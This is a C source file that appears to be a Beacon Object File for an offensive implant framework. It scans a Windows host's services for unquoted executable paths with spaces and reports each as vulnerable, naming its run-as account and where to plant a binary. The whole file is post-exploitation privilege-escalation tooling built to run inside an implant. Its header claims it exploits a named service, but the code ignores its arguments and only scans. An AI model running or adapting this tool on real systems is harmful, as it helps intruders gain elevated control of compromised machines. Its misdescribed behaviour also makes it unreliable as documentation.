/*
 * svc_privesc.c - Service privilege escalation
 * Exploits unquoted service paths
 * Args: arg1 = service name
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT WINBASEAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI ADVAPI32$EnumServicesStatusExA(SC_HANDLE, DWORD, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI ADVAPI32$QueryServiceConfigA(SC_HANDLE, LPQUERY_SERVICE_CONFIGA, DWORD, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerA(NULL, NULL, 0x0004);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open SCM");
        return;
    }

    /* Scan all services for unquoted paths */
    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
    ADVAPI32$EnumServicesStatusExA(hSCM, 0, 0x30, 0x03, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);

    if (bytesNeeded == 0) {
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    BYTE* pBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bytesNeeded);
    if (!pBuffer) { ADVAPI32$CloseServiceHandle(hSCM); return; }

    if (ADVAPI32$EnumServicesStatusExA(hSCM, 0, 0x30, 0x03, pBuffer, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle, NULL)) {
        ENUM_SERVICE_STATUS_PROCESSA* pServices = (ENUM_SERVICE_STATUS_PROCESSA*)pBuffer;

        BeaconPrintf(CALLBACK_OUTPUT, "=== Service Privesc Scan ===");

        for (DWORD i = 0; i < servicesReturned; i++) {
            SC_HANDLE hService = ADVAPI32$OpenServiceA(hSCM, pServices[i].lpServiceName, 0x0001);
            if (hService) {
                DWORD cfgLen = 0;
                ADVAPI32$QueryServiceConfigA(hService, NULL, 0, &cfgLen);
                if (cfgLen > 0) {
                    LPQUERY_SERVICE_CONFIGA pCfg = (LPQUERY_SERVICE_CONFIGA)HeapAlloc(GetProcessHeap(), 0, cfgLen);
                    if (pCfg) {
                        if (ADVAPI32$QueryServiceConfigA(hService, pCfg, cfgLen, &cfgLen)) {
                            const char* path = pCfg->lpBinaryPathName;
                            /* Check unquoted path with space */
                            if (path[0] != '"' && path[0] != '\\') {
                                int hasSpace = 0;
                                int hasExe = 0;
                                for (int j = 0; path[j]; j++) {
                                    if (path[j] == ' ') hasSpace = 1;
                                    if (path[j] == '.' && path[j+1] == 'e' && path[j+2] == 'x' && path[j+3] == 'e') {
                                        hasExe = 1;
                                    }
                                }
                                if (hasSpace && hasExe) {
                                    BeaconPrintf(CALLBACK_OUTPUT, "  [VULN] %s", pServices[i].lpServiceName);
                                    BeaconPrintf(CALLBACK_OUTPUT, "         Path: %s", path);
                                    BeaconPrintf(CALLBACK_OUTPUT, "         RunAs: %s", pCfg->lpServiceStartName);
                                    BeaconPrintf(CALLBACK_OUTPUT, "         → Plant at first space position");
                                }
                            }
                        }
                        HeapFree(GetProcessHeap(), 0, pCfg);
                    }
                }
                ADVAPI32$CloseServiceHandle(hService);
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Scan complete");
    }

    HeapFree(GetProcessHeap(), 0, pBuffer);
    ADVAPI32$CloseServiceHandle(hSCM);
}
